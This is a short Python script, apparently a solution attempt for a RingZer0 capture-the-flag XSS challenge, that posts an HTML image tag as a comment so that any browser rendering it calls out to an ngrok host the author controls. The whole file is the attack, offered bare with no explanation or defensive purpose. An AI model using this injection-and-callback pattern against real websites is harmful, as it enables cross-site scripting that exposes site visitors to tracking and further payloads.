#!/usr/bin/env python3

import base64
import http.client
import urllib.parse

payload = "<img src=http://monocotyledonous-jaqueline-archaically.ngrok-free.dev/>"

params = urllib.parse.urlencode({
    "comment": payload
})
headers = {
    "Content-type": "application/x-www-form-urlencoded"
}
conn = http.client.HTTPConnection("challenges.ringzer0team.com:10093")
conn.request("POST", "/xss2/", params, headers)
conn.close()